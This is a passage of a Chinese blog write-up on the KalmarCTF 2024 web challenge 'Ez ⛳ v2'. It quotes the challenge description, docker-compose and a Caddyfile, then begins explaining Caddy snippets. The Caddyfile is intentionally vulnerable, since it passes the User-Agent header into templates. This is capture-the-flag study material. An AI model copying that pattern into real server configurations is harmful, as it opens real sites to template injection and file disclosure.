@@ -1,0 +1,1130 @@
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="light">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>2024KalmarCTF-WEB复盘 - Wells's Blog</title>
+
+  
+    <meta name="description" content="前言： 靶场链接：https:&#x2F;&#x2F;kalmarc.tf&#x2F;challenges 难度太大了根本写不出来参考大佬的题解最后复盘出来的 原文链接：https:&#x2F;&#x2F;ireland.re&#x2F;posts&#x2F;KalmarCTF_2024&#x2F;  复盘题解Ez ⛳ v2题目描述 Caddy webserver is AWESOME, using a neat and compact syntax you can do">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024KalmarCTF-WEB复盘">
+<meta property="og:url" content="https://wells.host/posts/fbcd83ad/">
+<meta property="og:site_name" content="Wells&#39;s Blog">
+<meta property="og:description" content="前言： 靶场链接：https:&#x2F;&#x2F;kalmarc.tf&#x2F;challenges 难度太大了根本写不出来参考大佬的题解最后复盘出来的 原文链接：https:&#x2F;&#x2F;ireland.re&#x2F;posts&#x2F;KalmarCTF_2024&#x2F;  复盘题解Ez ⛳ v2题目描述 Caddy webserver is AWESOME, using a neat and compact syntax you can do">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wells.host/img/avatar.jpg">
+<meta property="article:published_time" content="2024-03-19T05:16:51.000Z">
+<meta property="article:modified_time" content="2025-08-05T09:16:33.144Z">
+<meta property="article:author" content="Wells">
+<meta property="article:tag" content="CTF-WriteUp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wells.host/img/avatar.jpg">
+  
+  
+  
+  <meta name="keywords" content="CTF-WriteUp">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Wells's Blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="/img/favicon.ico">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Wells","sameAs":[],"image":"/img/avatar.jpg"},"dateCreated":"2024-03-19T13:16:51+08:00","dateModified":"2025-08-05T17:16:33+08:00","datePublished":"2024-03-19T13:16:51+08:00","description":"","headline":"2024KalmarCTF-WEB复盘","mainEntityOfPage":{"@type":"WebPage","@id":"https://wells.host/posts/fbcd83ad/"},"publisher":{"@type":"Organization","name":"Wells","sameAs":[],"image":"/img/avatar.jpg","logo":{"@type":"ImageObject","url":"/img/avatar.jpg"}},"url":"https://wells.host/posts/fbcd83ad/","keywords":"CTF-WriteUp","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/img/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Wells's Blog</div><div class="sub cap">Learning Cyber Security...</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 20.536C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535" opacity="0.5"/><path fill="currentColor" d="M9.5 8.75A3.25 3.25 0 1 0 12.75 12a.75.75 0 0 1 1.5 0A4.75 4.75 0 1 1 9.5 7.25a.75.75 0 0 1 0 1.5"/><path fill="currentColor" d="M17.75 12a3.25 3.25 0 0 1-3.25 3.25a.75.75 0 0 0 0 1.5A4.75 4.75 0 1 0 9.75 12a.75.75 0 0 0 1.5 0a3.25 3.25 0 0 1 6.5 0"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper markdown"><div class="widget-header dis-select"><span class="name">无限进步<<<</span></div><div class="widget-body fs14"><p>少年应有鸿鹄志，当骑骏马踏平川</p>
+</div></widget>
+
+<widget class="widget-wrapper linklist"><div class="widget-body fs14">
+<div class="linklist left" style="grid-template-columns:repeat(1,1fr);">
+<a class="link" title="Web安全" href="/categories/web"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M3.378 5.082C3 5.62 3 7.22 3 10.417v1.574c0 5.638 4.239 8.375 6.899 9.536c.721.315 1.082.473 2.101.473c1.02 0 1.38-.158 2.101-.473C16.761 20.365 21 17.63 21 11.991v-1.574c0-3.198 0-4.797-.378-5.335c-.377-.537-1.88-1.052-4.887-2.081l-.573-.196C13.595 2.268 12.812 2 12 2s-1.595.268-3.162.805L8.265 3c-3.007 1.03-4.51 1.545-4.887 2.082" opacity="0.5"/><path fill="currentColor" fill-rule="evenodd" d="M6.688 9.8a5.75 5.75 0 1 0 10.625 4.4A5.75 5.75 0 0 0 6.688 9.8m5.256-2.032A.1.1 0 0 1 12 7.75c.004 0 .021 0 .056.018a.7.7 0 0 1 .17.134c.153.158.328.431.492.841c.162.404.296.901.39 1.466q.083.502.118 1.041h-2.452q.035-.539.118-1.04a7 7 0 0 1 .39-1.467c.164-.41.34-.683.492-.841a.7.7 0 0 1 .17-.134M9.412 9.964c-.068.415-.116.847-.14 1.286H7.816a4.25 4.25 0 0 1 2.01-2.903a9 9 0 0 0-.415 1.617M7.817 12.75H9.27c.025.439.073.871.141 1.286a9 9 0 0 0 .415 1.617a4.25 4.25 0 0 1-2.01-2.903m8.366-1.5a4.25 4.25 0 0 0-2.01-2.903c.18.486.318 1.034.415 1.617c.068.415.116.847.14 1.286zm-1.454 1.5h1.454a4.25 4.25 0 0 1-2.01 2.903c.18-.486.318-1.034.415-1.617c.068-.415.116-.847.14-1.286m-1.503 0a11 11 0 0 1-.118 1.04a7 7 0 0 1-.39 1.467c-.164.41-.34.683-.492.841a.7.7 0 0 1-.17.134a.1.1 0 0 1-.056.018c-.004 0-.021 0-.056-.018a.7.7 0 0 1-.17-.134c-.153-.158-.328-.431-.492-.841a7 7 0 0 1-.39-1.466a11 11 0 0 1-.118-1.041z" clip-rule="evenodd"/></svg><span>Web安全</span></div></a>
+<a class="link" title="渗透测试" href="/categories/penetration"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none"><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M14 21.71A7 7 0 0 1 5 15v-3.062A3.94 3.94 0 0 1 8.938 8h6.124A3.94 3.94 0 0 1 19 11.938V15a6.98 6.98 0 0 1-2 4.899"/><path fill="currentColor" d="M8.25 7.5a.75.75 0 0 0-1.5 0zm-.615-2.917a.75.75 0 1 0 1.246.834zM17.25 8.5v-1h-1.5v1zm-10.5-1v1h1.5v-1zm10.5 0c0-2.9-2.35-5.25-5.25-5.25v1.5a3.75 3.75 0 0 1 3.75 3.75zM12 2.25a5.25 5.25 0 0 0-4.365 2.333l1.246.834A3.75 3.75 0 0 1 12 3.75z"/><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M19 14h3M5 14H2M14.5 3.5L17 2M9.5 3.5L7 2m13.5 18l-2-.8m2-11.2l-2 .8M3.5 20l2-.8M3.5 8l2 .8M12 21.5V15"/></g></svg><span>渗透测试</span></div></a>
+<a class="link" title="代码审计" href="/categories/code-audit"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path d="m17 7.83l1.697 1.526c1.542 1.389 2.313 2.083 2.313 2.974c0 .89-.771 1.585-2.314 2.973L17 16.83"/><path d="m13.987 5l-3.974 14.83" opacity="0.5"/><path d="M7 7.83L5.304 9.356C3.76 10.745 2.99 11.44 2.99 12.33s.771 1.585 2.314 2.973L7 16.83"/></g></svg><span>代码审计</span></div></a>
+<a class="link" title="电子取证" href="/categories/forensics"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M10 20h3.627a5.25 5.25 0 1 1 8.369-6.34Q22 12.9 22 12c0-.442 0-1.608-.002-2H2.002C2 10.392 2 11.558 2 12c0 3.771 0 5.657 1.172 6.828S6.229 20 10 20" opacity="0.5"/><path fill="currentColor" d="M5.25 16a.75.75 0 0 1 .75-.75h4a.75.75 0 0 1 0 1.5H6a.75.75 0 0 1-.75-.75"/><path fill="currentColor" fill-rule="evenodd" d="M17.75 14.5a2.25 2.25 0 1 0 0 4.5a2.25 2.25 0 0 0 0-4.5M14 16.75a3.75 3.75 0 1 1 6.879 2.068l.901.902a.75.75 0 1 1-1.06 1.06l-.902-.901A3.75 3.75 0 0 1 14 16.75" clip-rule="evenodd"/><path fill="currentColor" d="M9.995 4h4.01c3.781 0 5.672 0 6.846 1.116c.846.803 1.083 1.96 1.149 3.884v1H2V9c.066-1.925.303-3.08 1.149-3.884C4.323 4 6.214 4 9.995 4"/></svg><span>电子取证</span></div></a>
+<a class="link" title="工具手册" href="/categories/tools"><div class="flex"><?xml version="1.0" encoding="UTF-8"?><svg width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M44 16C44 22.6274 38.6274 28 32 28C29.9733 28 28.0639 27.4975 26.3896 26.6104L9 44L4 39L21.3896 21.6104C20.5025 19.9361 20 18.0267 20 16C20 9.37258 25.3726 4 32 4C34.0267 4 35.9361 4.50245 37.6104 5.38959L30 13L35 18L42.6104 10.3896C43.4975 12.0639 44 13.9733 44 16Z" fill="none" stroke="#333" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>工具手册</span></div></a></div></div></widget>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/posts/5ae37a88/"><span class="title">数据库提权中的字符集挑战</span></a><a class="item title" href="/posts/72baa392/"><span class="title">Yakit插件开发</span></a><a class="item title" href="/posts/b1f1aefc/"><span class="title">常见协议与PHP伪协议</span></a><a class="item title" href="/posts/e85eefb/"><span class="title">SQL Server下SQL注入的应用</span></a><a class="item title" href="/posts/e73517db/"><span class="title">SQL注入</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/we11s" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" href="/about/#comments" rel="noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/942ebbf1a4b91.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/WriteUp/">WriteUp</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-03-19T05:16:51.000Z">2024-03-19</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-08-05T09:16:33.144Z">2025-08-05</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>2024KalmarCTF-WEB复盘</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><blockquote>
+<p><strong>前言：</strong></p>
+<p>靶场链接：<a target="_blank" rel="noopener" href="https://kalmarc.tf/challenges">https://kalmarc.tf/challenges</a></p>
+<p>难度太大了根本写不出来<br>参考大佬的题解最后复盘出来的</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://ireland.re/posts/KalmarCTF_2024/">https://ireland.re/posts/KalmarCTF_2024/</a></p>
+</blockquote>
+<h1 id="复盘题解"><a href="#复盘题解" class="headerlink" title="复盘题解"></a>复盘题解</h1><h2 id="Ez-⛳-v2"><a href="#Ez-⛳-v2" class="headerlink" title="Ez ⛳ v2"></a>Ez ⛳ v2</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
+<p>Caddy webserver is AWESOME, using a neat and compact syntax you can do a lot of powerful things, e.g. wanna know if your browser supports <em>HTTP3</em>? Or <em>TLS1.3</em>? etc</p>
+<p><em>Caddy web服务器非常棒，使用简洁紧凑的语法可以做很多强大的事情，例如，想知道你的浏览器是否支持HTTP3？或者TLS1.3？等等。</em></p>
+<p>Flag is located at <em>GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64)</em> go fetch it.</p>
+<p><em>Flag 位于GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64)，去获取它吧。</em></p>
+<p>附件：<a href="handout-caddy.zip">点击下载附件</a></p>
+</blockquote>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>下载完打开附件包发现只有四个文件，<code>Caddyfile</code>、<code>docker-compose.yml</code>这两个中有比较有用的信息</p>
+<p><code>docker-compose.yml</code>中的关键信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caddy:</span><br><span class="line">  image: caddy:2.7.6-alpine</span><br><span class="line">  volumes:</span><br><span class="line">    - ./Caddyfile:/etc/caddy/Caddyfile:ro</span><br><span class="line">    - ./flag:/wpqdDNHnYu8MZeclmpCr9Q:ro  # FILE WILL BE RENAMED TO SOMETHING SIMILAR RANDOM ON PROD</span><br><span class="line">    					   # 文件将在生产环境中被重新命名为类似的随机名称</span><br></pre></td></tr></table></figure>
+
+<p><code>Caddyfile</code>中为对Caddy的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">(sec_headers) &#123;</span><br><span class="line">    root * /</span><br><span class="line">    header &#123;</span><br><span class="line">        Content-Security-Policy &quot;default-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;</span><br><span class="line">        Strict-Transport-Security &quot;max-age=31536000&quot;</span><br><span class="line">        X-XSS-Protection 0</span><br><span class="line">        X-Content-Type-Options nosniff</span><br><span class="line">        X-Frame-Options DENY</span><br><span class="line">        Referrer-Policy &quot;no-referrer&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(html_reply) &#123;</span><br><span class="line">    import sec_headers</span><br><span class="line">    header Content-Type text/html</span><br><span class="line">    templates</span><br><span class="line">    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(json_reply) &#123;</span><br><span class="line">    templates &#123;</span><br><span class="line">        # By default placeholders are not replaced for json</span><br><span class="line">        mime application/json</span><br><span class="line">    &#125;</span><br><span class="line">    header Content-Type application/json</span><br><span class="line">    respond &quot;&#123;args[0]&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(http_reply) &#123;</span><br><span class="line">    tls internal &#123;</span><br><span class="line">        alpn &quot;&#123;args[0]&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    map &#123;args[0]&#125; &#123;proto_name&#125; &#123;</span><br><span class="line">        http/1.1 HTTP/1.1</span><br><span class="line">        h2 HTTP/2.0</span><br><span class="line">        h3 HTTP/3.0</span><br><span class="line">    &#125;</span><br><span class="line">    @correctALPN `&#123;http.request.proto&#125; == &#123;proto_name&#125;`</span><br><span class="line">    respond @correctALPN &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;</span><br><span class="line">    import html_reply &quot;You are connected with &#123;http.request.proto&#125; instead of &#123;proto_name&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;). &lt;!-- Debug: &#123;http.request.uuid&#125;--&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(tls_reply) &#123;</span><br><span class="line">    tls internal &#123;</span><br><span class="line">        protocols &#123;args[0]&#125; &#123;args[1]&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    header Access-Control-Allow-Origin &quot;*&quot;</span><br><span class="line">    import json_reply &#123;&quot;tls_version&quot;:&quot;&#123;tls_version&#125;&quot;,&quot;alpn&quot;:&quot;&#123;http.request.tls.proto&#125;&quot;,&quot;sni&quot;:&quot;&#123;http.request.tls.server_name&#125;&quot;,&quot;cipher_suite&quot;:&quot;&#123;http.request.tls.cipher_suite&#125;&quot;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mtls.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    tls internal &#123;</span><br><span class="line">        client_auth &#123;</span><br><span class="line">            mode require</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    templates</span><br><span class="line">    import html_reply `You are connected with client-cert &#123;http.request.tls.client.subject&#125;`</span><br><span class="line">&#125;</span><br><span class="line">tls.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import tls_reply tls1.2 tls1.3</span><br><span class="line">&#125;</span><br><span class="line">tls12.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import tls_reply tls1.2 tls1.2</span><br><span class="line">&#125;</span><br><span class="line">tls13.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import tls_reply tls1.3 tls1.3</span><br><span class="line">&#125;</span><br><span class="line">ua.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    tls internal</span><br><span class="line">    templates</span><br><span class="line">    import html_reply `User-Agent: &#123;&#123;.Req.Header.Get &quot;User-Agent&quot;&#125;&#125;`</span><br><span class="line">&#125;</span><br><span class="line">http.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    tls internal</span><br><span class="line">    templates</span><br><span class="line">    import html_reply &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;</span><br><span class="line">&#125;</span><br><span class="line">http1.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import http_reply http/1.1</span><br><span class="line">&#125;</span><br><span class="line">http2.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import http_reply h2</span><br><span class="line">&#125;</span><br><span class="line">http3.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import http_reply h3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    tls internal</span><br><span class="line">    import html_reply `Hello! Wanna know you if your browser supports &lt;a href=&quot;https://http1.caddy.chal-kalmarc.tf/&quot;&gt;http/1.1&lt;/a&gt;? &lt;a href=&quot;https://http2.caddy.chal-kalmarc.tf/&quot;&gt;http/2&lt;/a&gt;? Or fancy for some &lt;a href=&quot;https://http3.caddy.chal-kalmarc.tf/&quot;&gt;http/3&lt;/a&gt;?! Check your preference &lt;a href=&quot;https://http.caddy.chal-kalmarc.tf/&quot;&gt;here&lt;/a&gt;.&lt;br/&gt;We also allow you to check &lt;a href=&quot;https://tls12.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.2&lt;/a&gt;, &lt;a href=&quot;https://tls13.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.3&lt;/a&gt;, &lt;a href=&quot;https://tls.caddy.chal-kalmarc.tf/&quot;&gt;TLS preference&lt;/a&gt;, supports &lt;a href=&quot;https://mtls.caddy.chal-kalmarc.tf/&quot;&gt;mTLS&lt;/a&gt;? Checkout your &lt;a href=&quot;https://ua.caddy.chal-kalmarc.tf/&quot;&gt;User-Agent&lt;/a&gt;!&lt;!-- At some point we might even implement a &lt;a href=&quot;https://flag.caddy.chal-kalmarc.tf/&quot;&gt;flag&lt;/a&gt; endpoint! --&gt;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对于没用接触过的Caddy的我只能去官方文档看看其中的配置文件所代表的含义  <del>查了下发现还有中文文档哈哈哈哈哈哈哈哈哈哈</del></p>
+<p>链接：<a target="_blank" rel="noopener" href="https://caddy2.dengxiaolong.com/docs/">Caddy v2中文文档 (dengxiaolong.com)</a></p>
+<p>不懂的就半查半猜，问问狗屁通，然后有个初步的理解:</p>
+<p>Caddy中存在一个概念：<strong>片段</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(指令名)&#123;</span><br><span class="line">	具体的指令内容</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(html_reply) &#123;</span><br><span class="line">    import sec_headers</span><br><span class="line">    header Content-Type text/html</span><br><span class="line">    templates</span><br><span class="line">    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>片段类似于我们熟悉的概念：<strong>函数</strong>，可以在被调用</p>
+<p>在任何你需要的地方重复使用它：</p>
